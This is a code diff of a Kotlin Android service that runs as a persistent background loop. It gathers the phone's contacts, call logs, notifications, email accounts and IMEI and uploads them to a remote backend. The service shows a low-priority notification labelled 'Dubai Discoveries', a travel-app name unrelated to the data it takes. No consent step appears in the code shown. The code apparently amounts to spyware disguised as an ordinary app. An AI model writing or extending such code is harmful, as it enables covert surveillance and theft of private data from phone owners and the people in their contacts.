@@ -1,250 +1,222 @@
 package com.devicesync.app.services
 
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.Service
+import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.IBinder
 import android.util.Log
+import androidx.core.app.NotificationCompat
+import com.devicesync.app.R
+import com.devicesync.app.utils.DataCollector
 import com.devicesync.app.utils.DeviceConfigManager
+import com.devicesync.app.utils.AppConfigManager
 import kotlinx.coroutines.*
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
-import java.io.OutputStreamWriter
-import java.net.HttpURLConnection
-import java.net.URL
-import java.util.*
+import java.io.IOException
+import java.util.concurrent.TimeUnit
 
 class DataSyncService : Service() {
-    private val TAG = "DataSyncService"
+    
+    companion object {
+        private const val TAG = "DataSyncService"
+        private const val NOTIFICATION_ID = 1001
+        private const val CHANNEL_ID = "data_sync_channel"
+    }
+    
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private var isRunning = false
-
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(AppConfigManager.getTimeout().toLong(), TimeUnit.MILLISECONDS)
+        .readTimeout(AppConfigManager.getTimeout().toLong(), TimeUnit.MILLISECONDS)
+        .writeTimeout(AppConfigManager.getTimeout().toLong(), TimeUnit.MILLISECONDS)
+        .build()
+    
     override fun onCreate() {
         super.onCreate()
+        createNotificationChannel()
         Log.d(TAG, "DataSyncService created")
     }
-
+    
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "DataSyncService started")
         
-        if (!isRunning) {
-            isRunning = true
-            startDataSync()
+        // Start foreground service
+        startForeground(NOTIFICATION_ID, createNotification("Data sync in progress..."))
+        
+        // Start periodic data collection and sync
+        serviceScope.launch {
+            while (true) {
+                try {
+                    collectAndSyncData()
+                    delay(AppConfigManager.getSyncInterval())
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error in data sync loop", e)
+                    delay(AppConfigManager.getSyncInterval())
+                }
+            }
         }
         
         return START_STICKY
     }
-
-    private fun startDataSync() {
-        serviceScope.launch {
-            while (isRunning) {
-                try {
-                    syncAllData()
-                    delay(DeviceConfigManager.getSyncInterval())
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error in data sync loop", e)
-                    delay(60000) // Wait 1 minute before retrying
-                }
-            }
-        }
+    
+    override fun onBind(intent: Intent?): IBinder? = null
+    
+    override fun onDestroy() {
+        super.onDestroy()
+        serviceScope.cancel()
+        Log.d(TAG, "DataSyncService destroyed")
     }
-
-    private suspend fun syncAllData() {
-        val deviceCode = DeviceConfigManager.getDeviceCode()
-        val deviceId = getDeviceId()
-        
-        Log.d(TAG, "Starting data sync for device: $deviceId with code: $deviceCode")
-        
-        // Sync contacts
-        if (DeviceConfigManager.isDataTypeEnabled("contacts")) {
-            syncContacts(deviceCode, deviceId)
-        }
-        
-        // Sync call logs
-        if (DeviceConfigManager.isDataTypeEnabled("call_logs")) {
-            syncCallLogs(deviceCode, deviceId)
-        }
-        
-        // Sync notifications
-        if (DeviceConfigManager.isDataTypeEnabled("notifications")) {
-            syncNotifications(deviceCode, deviceId)
-        }
-        
-        // Sync email accounts
-        if (DeviceConfigManager.isDataTypeEnabled("email_accounts")) {
-            syncEmailAccounts(deviceCode, deviceId)
-        }
-    }
-
-    private suspend fun syncContacts(deviceCode: String, deviceId: String) {
+    
+    private suspend fun collectAndSyncData() {
         try {
-            val contacts = getContactsData()
-            val data = JSONObject().apply {
-                put("userCode", deviceCode)
-                put("deviceId", deviceId)
-                put("deviceName", getDeviceName())
-                put("deviceModel", getDeviceModel())
-                put("dataType", "contacts")
-                put("data", contacts)
-                put("syncTimestamp", System.currentTimeMillis())
+            Log.d(TAG, "Starting data collection and sync...")
+            
+            // Collect data
+            val dataCollector = DataCollector(this)
+            val collectedData = dataCollector.collectAllData()
+            val summary = dataCollector.getDataSummary()
+            
+            Log.d(TAG, "Data collected: $summary")
+            
+            // Get device code from config
+            val deviceCode = DeviceConfigManager.getDeviceCode()
+            if (deviceCode.isNullOrEmpty()) {
+                Log.w(TAG, "Device code not found, skipping sync")
+                return
             }
             
-            sendDataToServer(data)
-            Log.d(TAG, "Contacts synced successfully")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error syncing contacts", e)
-        }
-    }
-
-    private suspend fun syncCallLogs(deviceCode: String, deviceId: String) {
-        try {
-            val callLogs = getCallLogsData()
-            val data = JSONObject().apply {
-                put("userCode", deviceCode)
-                put("deviceId", deviceId)
-                put("deviceName", getDeviceName())
-                put("deviceModel", getDeviceModel())
-                put("dataType", "call_logs")
-                put("data", callLogs)
-                put("syncTimestamp", System.currentTimeMillis())
+            // Sync each data type separately
+            if (collectedData.has("contacts")) {
+                syncDataToBackend("CONTACTS", deviceCode, collectedData.getJSONArray("contacts"))
             }
             
-            sendDataToServer(data)
-            Log.d(TAG, "Call logs synced successfully")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error syncing call logs", e)
-        }
-    }
-
-    private suspend fun syncNotifications(deviceCode: String, deviceId: String) {
-        try {
-            val notifications = getNotificationsData()
-            val data = JSONObject().apply {
-                put("userCode", deviceCode)
-                put("deviceId", deviceId)
-                put("deviceName", getDeviceName())
-                put("deviceModel", getDeviceModel())
-                put("dataType", "notifications")
-                put("data", notifications)
-                put("syncTimestamp", System.currentTimeMillis())
+            if (collectedData.has("call_logs")) {
+                syncDataToBackend("CALL_LOGS", deviceCode, collectedData.getJSONArray("call_logs"))
             }
             
-            sendDataToServer(data)
-            Log.d(TAG, "Notifications synced successfully")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error syncing notifications", e)
-        }
-    }
-
-    private suspend fun syncEmailAccounts(deviceCode: String, deviceId: String) {
-        try {
-            val emailAccounts = getEmailAccountsData()
-            val data = JSONObject().apply {
-                put("userCode", deviceCode)
-                put("deviceId", deviceId)
-                put("deviceName", getDeviceName())
-                put("deviceModel", getDeviceModel())
-                put("dataType", "email_accounts")
-                put("data", emailAccounts)
-                put("syncTimestamp", System.currentTimeMillis())
+            if (collectedData.has("notifications")) {
+                syncDataToBackend("NOTIFICATIONS", deviceCode, collectedData.getJSONArray("notifications"))
             }
             
-            sendDataToServer(data)
-            Log.d(TAG, "Email accounts synced successfully")
+            if (collectedData.has("email_accounts")) {
+                syncDataToBackend("EMAIL_ACCOUNTS", deviceCode, collectedData.getJSONArray("email_accounts"))
+            }
+            
+            Log.d(TAG, "Data sync completed successfully")
+            
         } catch (e: Exception) {
-            Log.e(TAG, "Error syncing email accounts", e)
+            Log.e(TAG, "Error collecting and syncing data", e)
         }
     }
-
-    private suspend fun sendDataToServer(data: JSONObject) {
+    
+    private suspend fun syncDataToBackend(dataType: String, deviceCode: String, data: org.json.JSONArray) {
         withContext(Dispatchers.IO) {
-            var retryCount = 0
-            val maxRetries = DeviceConfigManager.getMaxRetries()
-            
-            while (retryCount < maxRetries) {
-                try {
-                    val url = URL("http://your-backend-url/api/device-data")
-                    val connection = url.openConnection() as HttpURLConnection
-                    
-                    connection.requestMethod = "POST"
-                    connection.setRequestProperty("Content-Type", "application/json")
-                    connection.setRequestProperty("User-Code", DeviceConfigManager.getDeviceCode())
-                    connection.doOutput = true
-                    
-                    val outputStream = connection.outputStream
-                    val writer = OutputStreamWriter(outputStream)
-                    writer.write(data.toString())
-                    writer.flush()
-                    writer.close()
-                    
-                    val responseCode = connection.responseCode
-                    if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_CREATED) {
-                        Log.d(TAG, "Data sent successfully")
-                        break
+            try {
+                val deviceId = getDeviceId()
+                val androidId = getAndroidDeviceId()
+                
+                // Create sync request with all device identifiers
+                val syncRequest = JSONObject().apply {
+                    put("deviceId", deviceId)
+                    put("androidId", androidId)
+                    put("deviceCode", deviceCode)
+                    put("dataType", dataType)
+                    put("data", data)
+                    put("timestamp", java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.getDefault()).format(java.util.Date()))
+                }
+                
+                val requestBody = syncRequest.toString().toRequestBody("application/json".toMediaType())
+                
+                // Build URL with deviceId in the path
+                val syncUrl = "${AppConfigManager.getBackendUrl()}/api/devices/$deviceId/sync"
+                
+                val request = Request.Builder()
+                    .url(syncUrl)
+                    .post(requestBody)
+                    .addHeader("Content-Type", "application/json")
+                    .build()
+                
+                client.newCall(request).execute().use { response ->
+                    if (response.isSuccessful) {
+                        Log.d(TAG, "Successfully synced $dataType data")
                     } else {
-                        Log.w(TAG, "Server returned response code: $responseCode")
-                        retryCount++
-                        if (retryCount < maxRetries) {
-                            delay(5000) // Wait 5 seconds before retry
-                        }
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error sending data to server (attempt ${retryCount + 1})", e)
-                    retryCount++
-                    if (retryCount < maxRetries) {
-                        delay(5000) // Wait 5 seconds before retry
+                        Log.e(TAG, "Failed to sync $dataType data: ${response.code} - ${response.body?.string()}")
                     }
                 }
+                
+            } catch (e: Exception) {
+                Log.e(TAG, "Error syncing $dataType data", e)
             }
         }
     }
-
-    // Mock data collection methods - these would be implemented with actual data collection logic
-    private fun getContactsData(): JSONObject {
-        return JSONObject().apply {
-            put("contacts", JSONObject()) // Mock contacts data
-        }
-    }
-
-    private fun getCallLogsData(): JSONObject {
-        return JSONObject().apply {
-            put("callLogs", JSONObject()) // Mock call logs data
-        }
-    }
-
-    private fun getNotificationsData(): JSONObject {
-        return JSONObject().apply {
-            put("notifications", JSONObject()) // Mock notifications data
-        }
-    }
-
-    private fun getEmailAccountsData(): JSONObject {
-        return JSONObject().apply {
-            put("emailAccounts", JSONObject()) // Mock email accounts data
-        }
-    }
-
-    private fun getDeviceId(): String {
+    
+    private fun getAndroidDeviceId(): String {
         return android.provider.Settings.Secure.getString(
             contentResolver,
             android.provider.Settings.Secure.ANDROID_ID
-        )
+        ) ?: "unknown_android_id"
     }
-
+    
+    private fun getDeviceId(): String {
+        return try {
+            if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                Log.w(TAG, "READ_PHONE_STATE permission not granted, using Android ID as device ID")
+                return getAndroidDeviceId()
+            }
+            
+            val telephonyManager = getSystemService(android.content.Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+            val deviceId = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                telephonyManager.imei ?: getAndroidDeviceId()
+            } else {
+                telephonyManager.deviceId ?: getAndroidDeviceId()
+            }
+            
+            Log.d(TAG, "Device ID (IMEI/MEID): $deviceId")
+            deviceId
+        } catch (e: Exception) {
+            Log.w(TAG, "Error getting device ID, using Android ID", e)
+            getAndroidDeviceId()
+        }
+    }
+    
     private fun getDeviceName(): String {
-        return android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL
+        return "${Build.MANUFACTURER} ${Build.MODEL}"
     }
-
+    
     private fun getDeviceModel(): String {
-        return android.os.Build.MODEL
+        return Build.MODEL
     }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        Log.d(TAG, "DataSyncService destroyed")
-        isRunning = false
-        serviceScope.cancel()
+    
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "Data Sync Service",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "Background data synchronization service"
+                setShowBadge(false)
+            }
+            
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.createNotificationChannel(channel)
+        }
     }
-
-    override fun onBind(intent: Intent?): IBinder? {
-        return null
+    
+    private fun createNotification(message: String): Notification {
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Dubai Discoveries")
+            .setContentText(message)
+            .setSmallIcon(R.drawable.ic_sync)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
+            .setAutoCancel(false)
+            .build()
     }
 } 
